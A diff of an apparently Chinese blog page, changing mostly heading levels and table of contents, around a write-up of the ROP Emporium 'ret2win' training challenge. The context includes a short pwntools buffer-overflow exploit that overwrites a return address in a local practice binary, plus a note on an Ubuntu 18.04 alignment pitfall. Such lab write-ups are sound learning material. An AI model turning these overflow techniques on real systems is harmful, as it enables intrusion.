@@ -482,12 +482,12 @@
       <section class="article typo">
         <div class="article-entry" itemprop="articleBody">
           
-          <h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><p>整个过程遇到了许多的坑，系统是ubuntu 18.04.</p>
+          <h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p>整个过程遇到了许多的坑，系统是ubuntu 18.04.</p>
 <a id="more"></a>
 
 
 
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote>
 <p><a href="https://ropemporium.com/challenge/ret2win.html" target="_blank" rel="noopener">https://ropemporium.com/challenge/ret2win.html</a></p>
 </blockquote>
 <p>checksec</p>
@@ -505,7 +505,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'./ret2win'</span>)</span><br><span class="line">info(<span class="string">'%#x target'</span>, elf.symbols.ret2win)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># ret2win = p64(elf.symbols.ret2win)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(<span class="number">0x400824</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag=io.recvall()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/04/13/GEvNs2xaceT8nQl.png" alt="image-20200413104630237"></p>
-<h2 id="一个坑"><a href="#一个坑" class="headerlink" title="一个坑"></a>一个坑</h2><p>ubuntu18.04下 覆盖的ret地址不能是ret2win的函数开始地址，应该是对应的system地址。</p>
+<h3 id="一个坑"><a href="#一个坑" class="headerlink" title="一个坑"></a>一个坑</h3><p>ubuntu18.04下 覆盖的ret地址不能是ret2win的函数开始地址，应该是对应的system地址。</p>
 <p>原因好像是18.04在内存对齐上有特殊的要求，等研究好了这里会补充</p>
 <blockquote>
 <p><a href="https://ropemporium.com/guide.html#Common%20pitfalls" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common%20pitfalls</a></p>
@@ -528,7 +528,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-14T19:21:13+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-14T19:28:03+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：2020年4月14日</p>
@@ -610,6 +610,8 @@
                 <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>这里是一个置顶帖w</p>
                 <p class='content'>
 
+
+
 TO-DO
             Ubuntu 18.04下pwn相关细节
             
@@ -617,7 +619,7 @@ TO-DO
 
  依旧有一些问题没有得到解决 
               
-          ...</p>
+        ...</p>
               </a>
             
             
@@ -681,7 +683,7 @@ TO-DO
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一个坑"><span class="toc-text">一个坑</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2win"><span class="toc-text">ret2win</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个坑"><span class="toc-text">一个坑</span></a></li></ol></li></ol>
     </div>
   </section>
 
